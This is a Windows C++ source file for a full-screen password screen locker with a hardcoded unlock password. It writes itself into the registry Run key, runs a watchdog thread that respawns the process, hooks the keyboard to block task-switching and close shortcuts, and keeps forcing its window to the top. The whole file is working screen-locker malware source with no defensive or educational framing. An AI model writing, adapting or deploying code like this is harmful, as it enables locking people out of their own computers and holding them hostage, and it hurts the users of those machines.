#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <string>
#include <cwchar>

// ---- Config ----
static const wchar_t* PASSWORD   = L"netanyahu";
static const wchar_t* MUTEX_NAME = L"Global\\ScreenLockerMutex_9f3a";
static const wchar_t* RUN_KEY    = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static const wchar_t* RUN_VALUE  = L"SysLockSvc";

// ---- State ----
static HHOOK    g_kbHook    = nullptr;
static HHOOK    g_msHook    = nullptr;
static HWND     g_lockWnd   = nullptr;
static HWND     g_passEdit  = nullptr;
static HANDLE   g_watchdog  = nullptr;
static bool     g_unlocking = false;
static HBITMAP  g_bgImage   = nullptr;

// ---- Forward decls ----
LRESULT CALLBACK LowLevelKeyboardProc(int, WPARAM, LPARAM);
LRESULT CALLBACK LowLevelMouseProc(int, WPARAM, LPARAM);
LRESULT CALLBACK LockWndProc(HWND, UINT, WPARAM, LPARAM);
DWORD WINAPI WatchdogThread(LPVOID);
void InstallPersistence();
void RemovePersistence();

// ---- Persistence ----
void InstallPersistence() {
    HKEY hk;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, RUN_KEY, 0, nullptr, 0,
                        KEY_SET_VALUE, nullptr, &hk, nullptr) == ERROR_SUCCESS) {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(nullptr, path, MAX_PATH);
        RegSetValueExW(hk, RUN_VALUE, 0, REG_SZ,
                       reinterpret_cast<const BYTE*>(path),
                       (DWORD)((wcslen(path) + 1) * sizeof(wchar_t)));
        RegCloseKey(hk);
    }
}

void RemovePersistence() {
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, RUN_KEY, 0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        RegDeleteValueW(hk, RUN_VALUE);
        RegCloseKey(hk);
    }
}

// ---- Watchdog ----
DWORD WINAPI WatchdogThread(LPVOID) {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    while (!g_unlocking) {
        HANDLE m = OpenMutexW(SYNCHRONIZE, FALSE, MUTEX_NAME);
        if (!m) {
            STARTUPINFOW si{ sizeof(si) };
            PROCESS_INFORMATION pi{};
            CreateProcessW(path, nullptr, nullptr, nullptr, FALSE,
                           DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP,
                           nullptr, nullptr, &si, &pi);
            if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
            Sleep(500);
        } else {
            CloseHandle(m);
            Sleep(250);
        }
    }
    return 0;
}

// ---- Hooks ----
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        auto* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD vk = kb->vkCode;
        bool alt  = (GetAsyncKeyState(VK_MENU)    & 0x8000) != 0;
        bool ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;

        if (g_passEdit && GetForegroundWindow() == g_lockWnd) {
            if (vk == VK_RETURN) { PostMessageW(g_lockWnd, WM_COMMAND, 1001, 0); return 1; }
            if (vk == VK_BACK)   { PostMessageW(g_passEdit, WM_KEYDOWN, VK_BACK, 0); return 1; }
            if ((vk >= 'A' && vk <= 'Z') || (vk >= '0' && vk <= '9') ||
                vk == VK_SPACE || vk == VK_OEM_MINUS) {
                return CallNextHookEx(g_kbHook, nCode, wParam, lParam);
            }
            return 1;
        }

        if (vk == VK_LWIN || vk == VK_RWIN) return 1;
        if (alt && (vk == VK_TAB || vk == VK_ESC || vk == VK_F4)) return 1;
        if (ctrl && (vk == VK_ESC || vk == VK_F4)) return 1;
        if (alt && vk == VK_F4) return 1;
        if (vk == VK_APPS) return 1;
        if (ctrl && alt && vk == VK_DELETE) return 1;
    }
    return CallNextHookEx(g_kbHook, nCode, wParam, lParam);
}

LRESULT CALLBACK LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    return CallNextHookEx(g_msHook, nCode, wParam, lParam);
}

// ---- Lock window ----
LRESULT CALLBACK LockWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
    case WM_CREATE:
        g_passEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | ES_PASSWORD | ES_LEFT | ES_AUTOHSCROLL,
            0, 0, 300, 30, hwnd, (HMENU)2001, GetModuleHandleW(nullptr), nullptr);
        SendMessageW(g_passEdit, WM_SETFONT,
            (WPARAM)GetStockObject(DEFAULT_GUI_FONT), TRUE);
        SetFocus(g_passEdit);
        return 0;

    case WM_SIZE: {
        RECT rc; GetClientRect(hwnd, &rc);
        int cx = (rc.right - rc.left);
        int cy = (rc.bottom - rc.top);
        int ew = 300, eh = 30;
        MoveWindow(g_passEdit, (cx - ew) / 2, cy / 2, ew, eh, TRUE);
        return 0;
    }

    case WM_CTLCOLORSTATIC:
    case WM_CTLCOLOREDIT: {
        HDC hdc = (HDC)wParam;
        SetTextColor(hdc, RGB(220, 220, 220));
        SetBkColor(hdc, RGB(20, 20, 20));
        static HBRUSH br = CreateSolidBrush(RGB(20, 20, 20));
        return (LRESULT)br;
    }

    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rc; GetClientRect(hwnd, &rc);

        if (g_bgImage) {
            BITMAP bm{};
            GetObjectW(g_bgImage, sizeof(bm), &bm);
            HDC mem = CreateCompatibleDC(hdc);
            HBITMAP oldBmp = (HBITMAP)SelectObject(mem, g_bgImage);
            SetStretchBltMode(hdc, HALFTONE);
            StretchBlt(hdc, 0, 0, rc.right, rc.bottom,
                       mem, 0, 0, bm.bmWidth, bm.bmHeight, SRCCOPY);
            SelectObject(mem, oldBmp);
            DeleteDC(mem);

            // semi-transparent dark band behind the text for readability
            int barTop    = rc.bottom / 2 - 90;
            int barBottom = rc.bottom / 2 + 90;
            int barW      = rc.right;
            int barH      = barBottom - barTop;
            HDC shadeDc = CreateCompatibleDC(hdc);
            HBITMAP shadeBmp = CreateCompatibleBitmap(hdc, barW, barH);
            HBITMAP oldShade = (HBITMAP)SelectObject(shadeDc, shadeBmp);
            RECT local{0, 0, barW, barH};
            HBRUSH shade = CreateSolidBrush(RGB(0, 0, 0));
            FillRect(shadeDc, &local, shade);
            DeleteObject(shade);
            BLENDFUNCTION bf{AC_SRC_OVER, 0, 150, 0};
            AlphaBlend(hdc, 0, barTop, barW, barH,
                       shadeDc, 0, 0, barW, barH, bf);
            SelectObject(shadeDc, oldShade);
            DeleteObject(shadeBmp);
            DeleteDC(shadeDc);
        } else {
            HBRUSH bg = CreateSolidBrush(RGB(10, 10, 10));
            FillRect(hdc, &rc, bg);
            DeleteObject(bg);
        }

        SetBkMode(hdc, TRANSPARENT);

        SetTextColor(hdc, RGB(235, 235, 235));
        HFONT f = CreateFontW(28, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
                              DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                              CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                              DEFAULT_PITCH, L"Segoe UI");
        HFONT old = (HFONT)SelectObject(hdc, f);
        RECT tr = rc;
        tr.bottom = rc.bottom / 2 - 40;
        DrawTextW(hdc, L"LOCKED", -1, &tr, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        SelectObject(hdc, old);
        DeleteObject(f);

        SetTextColor(hdc, RGB(200, 200, 200));
        HFONT f2 = CreateFontW(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
                               DEFAULT_CHARSET, OUT_DEFAULT_PRECIS,
                               CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
                               DEFAULT_PITCH, L"Segoe UI");
        old = (HFONT)SelectObject(hdc, f2);
        RECT pr = rc;
        pr.top = rc.bottom / 2 + 45;
        DrawTextW(hdc, L"Enter password to unlock", -1, &pr,
                  DT_CENTER | DT_TOP | DT_SINGLELINE);
        SelectObject(hdc, old);
        DeleteObject(f2);
        EndPaint(hwnd, &ps);
        return 0;
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == 1001) {
            wchar_t buf[256] = {0};
            GetWindowTextW(g_passEdit, buf, 256);
            if (wcscmp(buf, PASSWORD) == 0) {
                g_unlocking = true;
                RemovePersistence();
                if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
                if (g_msHook) UnhookWindowsHookEx(g_msHook);
                PostQuitMessage(0);
            } else {
                SetWindowTextW(g_passEdit, L"");
                MessageBeep(MB_ICONERROR);
            }
        }
        return 0;

    case WM_CLOSE:
    case WM_DESTROY:
        if (!g_unlocking) return 0;
        PostQuitMessage(0);
        return 0;

    case WM_KEYDOWN:
        if (wParam == VK_RETURN) {
            SendMessageW(hwnd, WM_COMMAND, 1001, 0);
            return 0;
        }
        break;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

// ---- Entry ----
int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    HANDLE mutex = CreateMutexW(nullptr, TRUE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        if (mutex) CloseHandle(mutex);
        return 0;
    }

    InstallPersistence();

    g_watchdog = CreateThread(nullptr, 0, WatchdogThread, nullptr, 0, nullptr);

    WNDCLASSEXW wc{ sizeof(wc) };
    wc.lpfnWndProc   = LockWndProc;
    wc.hInstance     = hInst;
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = L"ScreenLockerWnd";
    RegisterClassExW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    g_lockWnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"ScreenLockerWnd", L"Locked",
        WS_POPUP | WS_VISIBLE,
        0, 0, sw, sh,
        nullptr, nullptr, hInst, nullptr);

    // Load background image from the exe's own directory.
    {
        wchar_t exePath[MAX_PATH];
        GetModuleFileNameW(nullptr, exePath, MAX_PATH);
        wchar_t* slash = wcsrchr(exePath, L'\\');
        if (slash) *(slash + 1) = L'\0';
        std::wstring bgPath = exePath;
        bgPath += L"bg.bmp";
        g_bgImage = (HBITMAP)LoadImageW(nullptr, bgPath.c_str(), IMAGE_BITMAP, 0, 0,
                                        LR_LOADFROMFILE | LR_CREATEDIBSECTION);
    }

    ShowWindow(g_lockWnd, SW_SHOW);
    SetForegroundWindow(g_lockWnd);
    SetFocus(g_passEdit);
    InvalidateRect(g_lockWnd, nullptr, TRUE);

    g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc,
                                 GetModuleHandleW(nullptr), 0);
    g_msHook = SetWindowsHookExW(WH_MOUSE_LL, LowLevelMouseProc,
                                 GetModuleHandleW(nullptr), 0);

    SetTimer(g_lockWnd, 1, 200, nullptr);

    MSG msg;
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        if (msg.message == WM_TIMER && msg.hwnd == g_lockWnd) {
            if (!g_unlocking) {
                SetWindowPos(g_lockWnd, HWND_TOPMOST, 0, 0, 0, 0,
                             SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
                if (GetForegroundWindow() != g_lockWnd) {
                    SetForegroundWindow(g_lockWnd);
                    SetFocus(g_passEdit);
                }
            }
            continue;
        }
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    g_unlocking = true;
    if (g_watchdog) { WaitForSingleObject(g_watchdog, 500); CloseHandle(g_watchdog); }
    if (g_kbHook) UnhookWindowsHookEx(g_kbHook);
    if (g_msHook) UnhookWindowsHookEx(g_msHook);
    if (g_bgImage) DeleteObject(g_bgImage);
    ReleaseMutex(mutex);
    CloseHandle(mutex);
    return 0;
}